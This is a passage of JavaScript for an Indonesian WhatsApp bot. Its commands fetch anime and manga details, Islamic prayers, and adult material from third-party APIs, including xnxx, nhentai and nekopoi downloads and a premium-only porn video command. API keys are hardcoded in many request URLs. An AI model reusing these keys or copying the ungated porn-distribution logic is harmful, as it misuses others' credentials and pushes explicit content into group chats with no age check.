				.prepareMessageFromContent(
					from, {
						listMessage: {
							title: "",
							description: `*| NHENTAI SEARCH |*\n\nSilahkan pilih salah satu dibawah ini`,
							buttonText: "Click Here",
							listType: 1,
							sections: [{
								rows: rowsdata
							}]
						}
					}, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								sender,
								`${owner}@s.whatsapp.net`
							]
						}
					})
			varo
				.relayWAMessage(
					listM, {
						waitForAck: true
					})
					limitAdd(sender,
						limit)
		}
		break
		/*case 'joinn':
			if (isGroup && !
				itsMe)
			return reply(
					'Fitur Hanya dapat digunakan dalam Private Chat!'
					)
			if (args.length < 1)
				return reply(
					`Kirim perintah *${prefix}join* link grup`
					)
			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'chat.whatsapp.com'
					))
			return reply(
					mess
					.error
					.Iv)
			let code = args[0]
				.replace(
					'https://chat.whatsapp.com/',
					'')
			varo.acceptInvite(
					code)
				.then((res) =>
					reply(
						jsonformat(
							res)
						))
				.catch((err) =>
					reply(
						jsonformat(
							err)
						))
			break*/

		/*case 'ownerg':
			let inilist = []
			for (let i of
					ownerNumber) {
				let vname =
					varo
					.contacts[
					i] !=
					undefined ?
					varo
					.contacts[i]
					.vname ||
					varo
					.contacts[i]
					.notify :
					undefined
				inilist.push({
					"displayName": 'chi',
					"vcard": 'BEGIN:VCARD\n' +
						'VERSION:3.0\n' +
						`FN:ANONYMUS CHAT\n` +
						`ORG: CHAT dan #start untuk mulai ;\n` +
						`TEL;type=CELL;type=VOICE;waid=+12404540811:+12404540811\n` +
						'END:VCARD'
						.trim()
				})
			}
			hehe = await varo
				.sendMessage(
					from, {
						"displayName": `${inilist.length} kontak`,
						"contacts": inilist
					},
					'contactsArrayMessage', {
						quoted: mek
					})
			button = [
			{
				buttonId: '.help1',
				buttonText: {
					displayText: '☰ YOUTUBE'
				},
				type: 1
			},
			{
				buttonId: '.command',
				buttonText: {
					displayText: '☰ INSTAGRAM'
				},
				type: 1
			},
			{
				buttonId: '.tiktok',
				buttonText: {
					displayText: '☰ TIKTOK'
				},
				type: 1
			}]
			buttons = {
				contentText: 'Nih Nomer Owner Ku Mau Tau Tentang Apa Ya ?',
				footerText: faketeks,
				buttons: button,
				headerType: 1
			}
			await varo
				.sendMessage(
					from,
					buttons,
					MessageType
					.buttonsMessage, {
						quoted: mek
					})
			break*/
		case 'join':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			if (args.length ==
				0) return reply(`Command untuk memasukan bot ke grup\n\nExample : ${prefix+command} https://chat.whatsapp.com`)

			if (!isUrl(args[
				0]) && !args[0]
				.includes(
					'https://chat.whatsapp.com/'
					))
			return reply(
					'*Invalid Link!*'
					)
			link = args[0]
				.replace(
					'https://chat.whatsapp.com/',
					'')
			fak = varo.query({
				json: ['action',
					'invite',
					link
				],
				expect200: true
			})
			reply(
				'*Successfully Entered Group*')
			break
		case 'xnxxdown':
		case 'xxnxdownload':
			if (!isPremium)
				return reply(
					mess
					.only
					.premium
					)
			if (!q) return reply(
				`Command untuk mendownload adult video dari xnxx.com\n\nExample : ${prefix+command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`
				)
			anu =
				await fetchJson(
					`https://api.lolhuman.xyz/api/xnxx?apikey=vxro2k21&url=${q}`
					)
			nxx =
				`*| XNXX DOWNLOADER |*
				
*Judul* : ${anu.result.title}
*Durasi* : ${anu.result.duration}
*Rating* : ${anu.result.rating}
*Penonton* : ${anu.result.view}
*Like* : ${anu.result.like}
*Dislike* : ${anu.result.dislike}
*Comment*: ${anu.result.comment}

_Sedang mengirim video..._`
			sendMediaURL(from,
				`${anu.result.thumbnail}`,
				nxx)
			sendMediaURL(from,
				`${anu.result.link[0].link}`,
				`${anu.result.title}`
				)
				limitAdd(sender,
					limit)
			break
		/*case 'harrypotter':
			if (args.length ==
				0) return reply(
				`Teks Nya Mana ?\nContoh: ${prefix + command} chi YT7`
				)
			zerr = args.join(
				" ")
			buffer =
				await getBuffer(
					`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=vxro2k21&text=${zerr}`
					)
			varo.sendMessage(
				from,
				buffer,
				image, {
					quoted: mek,
					caption: '*©Creator : chi YT7*'
				})*/

		case 'nhentaipdf':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
			if (args.length ==
				0) return reply(
					`Command untuk mendownload doujin pdf dari website nhentai\n\nExample : ${prefix+command} 317986`
				)
			if (isNaN(Number(
						args[0]
						)))
				return await reply(`Invalid Code!`)
				henid = args[0]
				reply(mess.wait)
				result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${args[0]}?apikey=vxro2k21`)
				anu = result.result
				pdf = await getBuffer(anu)
				varo
					.sendMessage(
						from,
						pdf,
						document, {
							quoted: mek,
							mimetype: Mimetype
								.pdf,
							filename: `${args[0]}.pdf`
						})
						limitAdd(sender,
							limit)
			break

		case 'manga':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari manga\n\nExample : ${prefix+command} Kanojo Okarisimasu`
				)
			reply(mess.wait)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/manga?apikey=vxro2k21&query=${query}`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Id : ${get_result.id}\n`
			ini_txt +=
				`Id MAL : ${get_result.idMal}\n`
			ini_txt +=
				`Title : ${get_result.title.romaji}\n`
			ini_txt +=
				`English : ${get_result.title.english}\n`
			ini_txt +=
				`Native : ${get_result.title.native}\n`
			ini_txt +=
				`Format : ${get_result.format}\n`
			ini_txt +=
				`Chapters : ${get_result.chapters}\n`
			ini_txt +=
				`Volume : ${get_result.volumes}\n`
			ini_txt +=
				`Status : ${get_result.status}\n`
			ini_txt +=
				`Source : ${get_result.source}\n`
			ini_txt +=
				`Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
			ini_txt +=
				`End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
			ini_txt +=
				`Genre : ${get_result.genres.join(", ")}\n`
			ini_txt +=
				`Synonyms : ${get_result.synonyms.join(", ")}\n`
			ini_txt +=
				`Score : ${get_result.averageScore}%\n`
			ini_txt +=
				`Characters : \n`
			ini_character =
				get_result
				.characters
				.nodes
			for (var x of
					ini_character) {
				ini_txt +=
					`- ${x.name.full} (${x.name.native})\n`
			}
			ini_txt +=
				`\nDescription : ${get_result.description}`
			thumbnail =
				await getBuffer(
					get_result
					.coverImage
					.large)
			await varo
				.sendMessage(
					from,
					thumbnail,
					image, {
						quoted: mek,
						caption: ini_txt
					})
					limitAdd(sender,
						limit)
			break
		case 'doujindesu':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (isGroup && !isNsfw) return reply(`Fitur NSFW belum aktif di group ini\n\nKetik *${prefix}nsfw* untuk mengaktifkan`)
			if (!q) return reply(`Command untuk mencari doujin dari doujindesu\n\nExample : ${prefix+command} Thirst To Fill`)
			reply(mess.wait)
			try {
				doujinnya =
					await fetchJson(`https://api.lolhuman.xyz/api/doujindesusearch?apikey=vxro2k21&query=${q}`)
				data = doujinnya.result
				xixixai =
					`*| DOUJINDESU SEARCH |*\n`
				for (let i =
					0; i < data
					.length; i++
					) {
					xixixai +=
						`\n*Urutan ${i+1}*\n▷ *Title:* ${data[i].title}\n▷ *Type:* ${data[i].type}\n▷ *Link:* ${data[i].link}`
				}
				buffer =
					await getBuffer(
						data[0]
						.thumbnail)
				varo
					.sendMessage(
						from,
						buffer,
						image, {
							caption: xixixai,
							quoted: mek
						})
						limitAdd(sender,
							limit)
			} catch (e) {
				console.log(e)
				reply(`Error, judul tidak ditemukan!`)
			}
			break
		/*case 'searchanime':
			if (!q) return reply(`Command untuk mencari anime\n\nExample : ${prefix+command} Kanojo Okarishimasu`)
			try {
				anime
					.searchAnime(
						`${body.slice(13)}`,
						1).then(
						res => {
							teks = `*「 BERHASIL DITEMUKAN 」*

▷ Type : ${res[0].type}
▷ Title Romaji : ${res[0].titles.romaji}
▷ Title English : ${res[0].titles.english}
▷ Id : ${res[0].id}
▷ NSFW : ${res[0].nsfw}
▷ Synopsis : ${res[0].synopsis}

▷ Average Rating : ${res[0].averageRating}
▷ User Count : ${res[0].userCount}
▷ Favorites Count : ${res[0].favoritesCount}
▷ Start Date : ${res[0].startDate}
▷ End Date : ${res[0].endDate}
▷ Popularity Rank : ${res[0].popularityRank}
▷ Rating Rank : ${res[0].ratingRank}
▷ Age Rating : ${res[0].ageRating}
▷ Minimum Age : ${res[0].ageRatingGuide}
▷ Sub Type : ${res[0].subType}
▷ Show Type : ${res[0].showType}
▷ Episode Count : ${res[0].episodeCount}
▷ Episode Length : ${res[0].episodeLength}`
							getBuffer
								(res[
										0]
									.posterImage
									.original
									)
								.then(
									ress => {
										varo
											.sendMessage(
												from,
												ress,
												image, {
													quoted: mek,
													caption: teks
												}
												)
									}
									)
						})
			} catch (e) {
				reply(
					`Maaf ${pushname}, Anime tidak dapat ditemukan`)
			}
			break*/
		case 'tts':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
					reply(mess.wait)
			//	if (args.length < 1) return varo.sendMessage(from, 'Diperlukan kode bahasa!!', text, {quoted: mek})
			ja = args[0]
			const gtts =
				require(
					'./VXROLB/gtts'
					)(ja)
			//	if (args.length < 2) return varo.sendMessage(from, 'Mana teks yang ma di jadiin suara? suara saya kah:v?', text, {quoted: mek})
			dtt = body.slice(8)
			ranm = getRandom(
				'.mp3')
			rano = getRandom(
				'.ogg')
			dtt.length >
				100000 ?
				reply(
					'Teks nya kepanjangan!'
					) :
				gtts.save(ranm,
					dtt,
					function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`,
							(
								err) => {
								fs.unlinkSync(
									ranm
									)
								buffer
									=
									fs
									.readFileSync(
										rano
										)
								if (
									err)
									return reply(
										mess
										.stikga()
										)
								varo
									.sendMessage(
										from,
										buffer,
										audio, {
											quoted: mek,
											ptt: true
										}
										)
								fs.unlinkSync(
									rano
									)
							}
							)
					})
			break
		case 'kusonime':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			try {
				if (args
					.length < 1)
					return reply(
						`Command untuk mencari anime dari kusonime.com\n\nExample : ${prefix+command} Kanojo Okarishimasu`
						)
				mmeku = body
					.slice(10)
					reply(mess.wait)
				await axios.get(
						'https://kusonime.com/?s=' +
						mmeku)
					.then(async res => {
						const
							animenya =
							await cheerio
							.load(
								res
								.data
								);
						const
							linkanime1 =
							await animenya(
								'div[class="content"] > h2 > a'
								);
						let link1 =
							await linkanime1
							.attr(
								'href'
								);
						await axios
							.get(
								link1
								)
							.then(
								async res => {
									let links360 =
										await [];
									let links480 =
										await [];
									let links720 =
										await [];
									let links1080 =
										await [];
									const
										animeitu =
										await cheerio
										.load(
											res
											.data
											);
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl > a')
										.slice(
											0,
											3
											)
										.each(
											async (index,
												value
												) => {
												let link360 =
													await animeitu(
														value
														)
													.attr(
														'href'
														);
												await links360
													.push({
														link360
													});
											});
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl + .smokeurl > a')
										.slice(
											0,
											3
											)
										.each(
											async (index,
												value
												) => {
												let link480 =
													await animeitu(
														value
														)
													.attr(
														'href'
														);
												await links480
													.push({
														link480
													});
											});
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl + .smokeurl + .smokeurl > a')
										.slice(
											0,
											3
											)
										.each(
											async (index,
												value
												) => {
												let link720 =
													await animeitu(
														value
														)
													.attr(
														'href'
														);
												await links720
													.push({
														link720
													});
											});
									await animeitu
										(
											'.dlbod > .smokeddl > .smokeurl + .smokeurl + .smokeurl + .smokeurl > a')
										.each(
											async (index,
												value
												) => {
												let link1080 =
													await animeitu(
														value
														)
													.attr(
														'href'
														);
												await links1080
													.push({
														link1080
													});
											});
									let judul =
										await animeitu(
											'div[class="post-thumb"] > h1[class="jdlz"]'
											)
										.text();
									let genre =
										await animeitu(
											'div[class="info"] > p:nth-child(2)'
											)
										.text();
									let totaleps =
										await animeitu(
											'div[class="info"] > p:nth-child(7)'
											)
										.text();
									let durasi =
										await animeitu(
											'div[class="info"] > p:nth-child(9)'
											)
										.text();
									let tglrilis =
										await animeitu(
											'div[class="info"] > p:nth-child(10)'
											)
										.text();
									let result360 =
										await JSON
										.stringify(
											links360
											)
										.replace(
											/,/g,
											'\n'
											)
										.replace(
											/"/g,
											''
											)
										.replace(
											/link360/g,
											''
											)
										.replace(
											/{/g,
											''
											)
										.replace(
											/}/g,
											''
											)
										.replace(
											/\[/g,
											''
											)
										.replace(
											/\]/g,
											''
											);
									let result480 =
										await JSON
										.stringify(
											links480
											)
										.replace(
											/,/g,
											'\n'
											)
										.replace(
											/"/g,
											''
											)
										.replace(
											/link480/g,
											''
											)
										.replace(
											/{/g,
											''
											)
										.replace(
											/}/g,
											''
											)
										.replace(
											/\[/g,
											''
											)
										.replace(
											/\]/g,
											''
											);
									let result720 =
										await JSON
										.stringify(
											links720
											)
										.replace(
											/,/g,
											'\n'
											)
										.replace(
											/"/g,
											''
											)
										.replace(
											/link720/g,
											''
											)
										.replace(
											/{/g,
											''
											)
										.replace(
											/}/g,
											''
											)
										.replace(
											/\[/g,
											''
											)
										.replace(
											/\]/g,
											''
											);
									let result1080 =
										await JSON
										.stringify(
											links1080
											)
										.replace(
											/,/g,
											'\n'
											)
										.replace(
											/"/g,
											''
											)
										.replace(
											/link1080/g,
											''
											)
										.replace(
											/{/g,
											''
											)
										.replace(
											/}/g,
											''
											)
										.replace(
											/\[/g,
											''
											)
										.replace(
											/\]/g,
											''
											);
									return await varo
										.sendMessage(
											from,
											`*| KUSONIME SEARCH |*\n\nJudul : ${judul}\n${genre}\n${totaleps}\n${durasi}\n${tglrilis}\n\nResolusi 360p : \n${result360}\n\nResolusi 480p : \n${result480}\n\nResolusi 720p : \n${result720}\n\nResolusi 1080p : \n${result1080}`,
											text, {
												quoted: mek
											}
											)
											limitAdd(sender,
												limit)
								})
					})
			} catch (err) {
				reply(
					`Anime yang kamu cari di kusonime tidak ditemukan.`)
			}
			break
		case 'otakudesu':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			if (!q) return reply(
				`Command untuk mencari anime dari Otakudesu.info\n\nExample : ${prefix+command} Jujutsu Kaisen`
				)
				reply(mess.wait)
			let anime = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=vxro2k21&query=${q}`)
			res = anime.result
			rem =
				`*| OTAKUDESU SEARCH |*
				
*Judul* : ${res.judul}
*Jepang* : ${res.japanese}
*Rating* : ${res.rating}
*Produser* : ${res.producers}
*Episode* : ${res.episodes}
*Durasi* : ${res.duration}
*Rilis* : ${res.aired}
*Studio* : ${res.studios}
*Genre* : ${res.genres}
*Credit* : ${res.credit}
*Link* : https://otakudesu.info/?s=${encodeURIComponent(q)}&post_type=anime`
			/*ram =
				await getBuffer(dfrply)*/
			varo.sendMessage(
				from, dfrply,
				image, {
					quoted: mek,
					caption: rem
				})
				limitAdd(sender,
					limit)

			break
		case 'darkjokes':
		case 'darkjoke':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})

			bapakao = body
				.slice(9)
			sendMediaURL(from,
				`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=vxro2k21`
				)
			break

		case 'komiku':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(
				`Command untuk mencari komik dari komiku\n\nExample : ${prefix+command} Jujutsu Kaisen`
				)
			let komik = await hx
				.komiku(q)
			result =
				`*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
			sendMediaURL(from,
				komik.image,
				result)
				limitAdd(sender,
					limit)
			break
		case 'chara':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(
				`Command untuk mencari gambar character anime\n\nExample : ${prefix+command} Mizuhara`
				)
				reply(mess.wait)
			let im = await hx
				.chara(q)
			let acak = im[Math
				.floor(Math
					.random() *
					im
					.length)
				]
			let li =
				await getBuffer(
					acak)
			await varo
				.sendMessage(
					from, li,
					image, {
						quoted: mek
					})
					limitAdd(sender,
						limit)
			break
		/*case "minion":

			if (args.length < 1)
				return reply(
					`Command untuk mencari video di YouTube\n\nExample : ${prefix+command} Cloud Bread Gustixa`
					)
			biji = body.slice(8)
			atetepe =
				await getBuffer(
					`https://bx-hunter.herokuapp.com/api/flamingtext/minions?text=${biji}&apikey=Ikyy69`
					)
			varo.sendMessage(
				from,
				atetepe,
				image, {
					quoted: mek
				})
			break*/

		case 'happymod':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
				`Example: ${prefix + command} free fire`
				)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://dapuhy-api.herokuapp.com/api/search/happymod?query=${query}&apikey=vxrobot2k21`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
				kontol) {
				ini_txt +=
					`${x.title}\n`
				ini_txt +=
					`${x.url}\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
		case 'tahlil':
			if (isBanned) return reply(mess.baned)
			reply(mess.wait)
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/tahlil?apikey=vxrobot2k21`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
				kontol) {
				ini_txt +=
					`${x.id}\n`
				ini_txt +=
					`${x.title}\n`
				ini_txt +=
					`${x.arabic}\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)

			break
		case 'doaharian':
			if (isBanned) return reply(mess.baned)
			reply(mess.wait)
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/doaharian?apikey=vxrobot2k21`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
				kontol) {
				ini_txt +=
					`${x.title}\n`
				ini_txt +=
					`${x.latin}\n`
				ini_txt +=
					`${x.translation}\n\n`
			}
			reply(ini_txt)

			break
		case 'niatshalat':
			if (isBanned) return reply(mess.baned)
			reply(mess.wait)
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/niatshalat?apikey=vxrobot2k21`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
				kontol) {
				ini_txt +=
					`${x.id}\n`
				ini_txt +=
					`${x.name}\n`
				ini_txt +=
					`${x.latin}\n\n`
			}
			reply(ini_txt)

			break




		case 'wirid':
			if (isBanned) return reply(mess.baned)
			reply(mess.wait)
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/wirid?apikey=vxrobot2k21`, {
						method: 'get'
					})
			kontol = get_result
				.result
			ini_txt =
				"Result : \n"
			for (var x of
				kontol) {
				ini_txt +=
					`${x.id}\n`
				ini_txt +=
					`${x.times}\n`
				ini_txt +=
					`${x.arabic}\n`
				ini_txt +=
					`${x.tnc}\n\n`
			}
			reply(ini_txt)

			break
			/*  case 'ayatkursi': 
               
                    get_result = await fetchJson(`https://api.dapuhy.ga/api/islam/ayatkursi?apikey=vxrobot2k21`, {method: 'get'})
                    kontol = get_result.result
                    ini_txt = "Result : \n"
                    for (var x of kontol) {
                        ini_txt += `${x.tafsir}\n`
                        ini_txt += `${x.arabic}\n`
                        ini_txt += `${x.latin}\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break   */
		case 'ayatkursi':
			if (isBanned) return reply(mess.baned)
			reply(mess.wait)
			get_result =
				await fetchJson(
					`https://api.dapuhy.ga/api/islam/ayatkursi?apikey=vxrobot2k21`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Tasfir : ${get_result.tafsir}\n`
			ini_txt +=
				`arabic : ${get_result.arabic}\n`
			ini_txt +=
				`Size : ${get_result.latin}\n`
			reply(ini_txt)
			break
		case 'nekopoi':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari detail H-anime dari nekopoi.care\n\nExample : ${prefix+command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`
				)
				reply(mess.wait)
			ini_url = args[0]
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/nekopoi?apikey=vxro2k21&url=${ini_url}`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`*| NEKOPOI DETAIL |*\n\n\`\`\`▷ Title : ${get_result.anime}\`\`\`\n`
			ini_txt +=
				`\`\`\`▷ Porducers : ${get_result.producers}\`\`\`\n`
			ini_txt +=
				`\`\`\`▷ Duration : ${get_result.duration}\`\`\`\n`
			ini_txt +=
				`\`\`\`▷ Size : ${get_result.size}\`\`\`\n`
			ini_txt +=
				`\`\`\`▷ Sinopsis : ${get_result.sinopsis}\`\`\`\n`
			link = get_result
				.link
			for (var x in
				link) {
				ini_txt +=
					`\n${link[x].name}\n`
				link_dl = link[
					x].link
				for (var y in
						link_dl) {
					ini_txt +=
						`${y} - ${link_dl[y]}\n`
				}
			}
			ini_buffer =
				await getBuffer(
					get_result
					.thumb)
			await varo
				.sendMessage(
					from,
					ini_buffer,
					image, {
						quoted: mek,
						caption: ini_txt
					})
					limitAdd(sender,
						limit)
			break
		case 'nekopoisearch':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length ==
				0) return reply(
					`Command untuk mencari H-anime dari nekopoi.care\n\nExample : ${prefix+command} Isekai Harem`
				)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/nekopoisearch?apikey=vxro2k21&query=${query}`
					)
			get_result =
				get_result
				.result
			ini_txt = "*| NEKOPOI SEARCH |*\n\n"
			for (var x of
					get_result) {
				ini_txt +=
					`\`\`\`▷ Title : ${x.title}\`\`\`\n`
				ini_txt +=
					`\`\`\`▷ Link : ${x.link}\`\`\`\n`
				ini_txt +=
					`\`\`\`▷ Thumbnail : ${x.thumbnail}\`\`\`\n\n`
			}
			reply(ini_txt)
			limitAdd(sender,
				limit)
			break
		case 'kanna':
		case 'sagiri':
		case 'megumin':
		case 'wallnime':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			getBuffer(
				`https://api.lolhuman.xyz/api/random/${command}?apikey=vxro2k21`
				).then((
					gambar
					) => {
					varo
						.sendMessage(
							from,
							gambar,
							image, {
								quoted: mek,
								thumbnail: Buffer
									.alloc(
										0
										)
							}
							)
				})
				limitAdd(sender,
					limit)
			break
		case 'bokep':
            if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			reply(mess.wait)

			aprii =
				await getBuffer(
					`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`
					)

			varo.sendMessage(
				from, aprii,
				video, {
					mimetype: 'video/mp4',
					quoted: mek
				})

			break
		/*case 'dosa1':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)
			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file'
				})

			break

		case 'dosa2':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file'
				})

			break

		case 'dosa3':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file'
				})

			break

		case 'dosa4':

			qute = fs
				.readFileSync(
					'./varo/zero.jpg'
					)

			varo.sendMessage(
				from, qute,
				image, {
					quoted: mek,
					caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file'
				})

			break

		case 'dosa5':

			qute = fs
